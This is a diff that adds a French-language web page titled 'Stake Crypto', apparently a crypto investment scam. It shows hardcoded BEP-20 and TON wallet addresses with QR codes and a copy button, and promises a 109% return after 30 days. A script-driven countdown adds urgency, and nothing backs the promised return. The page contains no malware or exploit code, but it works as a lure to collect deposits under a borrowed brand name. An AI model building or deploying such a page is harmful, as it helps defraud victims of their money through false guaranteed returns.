@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stake Crypto</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="info-box" class="info-box">
+        <p>Vos retours après 30 jours : <strong>109%</strong> de votre montant</p>
+        <p>Temps restant : <span id="countdown"></span></p>
+    </div>
+    <div class="container">
+        <h1>Déposer des cryptos</h1>
+        <label for="crypto-select">Choisissez votre réseau :</label>
+        <select id="crypto-select">
+            <option value="bep20">BEP-20 (USDT)</option>
+            <option value="ton">TON</option>
+        </select>
+        <div id="crypto-info">
+            <p id="address"></p>
+            <button id="copy-button">Copier l'adresse</button>
+            <img id="qr-code" src="" alt="QR Code">
+        </div>
+    </div>
+    <script>
+        const cryptoData = {
+            bep20: {
+                address: "0x9bb827f556fc13b04f0a87d0428d810611dcdbbe",
+                qr: "a.jpg"
+            },
+            ton: {
+                address: "UQA8doGNelyvDtMhyDxF2Tn2R2HNQJdUq7IentsyOLF9ml8-",
+                qr: "ton.jpg"
+            }
+        };
+
+        const select = document.getElementById("crypto-select");
+        const addressP = document.getElementById("address");
+        const qrCode = document.getElementById("qr-code");
+        const copyButton = document.getElementById("copy-button");
+        const countdownElement = document.getElementById("countdown");
+
+        function updateCryptoInfo() {
+            const selected = select.value;
+            addressP.textContent = `Adresse: ${cryptoData[selected].address}`;
+            qrCode.src = cryptoData[selected].qr;
+        }
+
+        function copyAddress() {
+            const selected = select.value;
+            navigator.clipboard.writeText(cryptoData[selected].address).then(() => {
+                alert("Adresse copiée dans le presse-papiers!");
+                startCountdown();
+            }).catch(err => {
+                console.error("Erreur lors de la copie", err);
+            });
+        }
+
+        function startCountdown() {
+            let endTime = localStorage.getItem("countdownEnd");
+            if (!endTime) {
+                endTime = Date.now() + (30 * 24 * 60 * 60 * 1000); // 30 jours en millisecondes
+                localStorage.setItem("countdownEnd", endTime);
+            }
+
+            function updateCountdown() {
+                const now = Date.now();
+                const timeLeft = endTime - now;
+                if (timeLeft <= 0) {
+                    countdownElement.textContent = "Terminé";
+                    localStorage.removeItem("countdownEnd");
+                    return;
+                }
+
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+                countdownElement.textContent = `${days}j ${hours}h ${minutes}m ${seconds}s`;
+                setTimeout(updateCountdown, 1000);
+            }
+
+            updateCountdown();
+        }
+
+        select.addEventListener("change", updateCryptoInfo);
+        copyButton.addEventListener("click", copyAddress);
+        updateCryptoInfo();
+        startCountdown();
+    </script>
+    <style>
+        .info-box {
+            width: 80%;
+            margin: 20px auto;
+            padding: 15px;
+            background: #292929;
+            color: #fff;
+            text-align: center;
+            font-size: 18px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</body>
+</html>
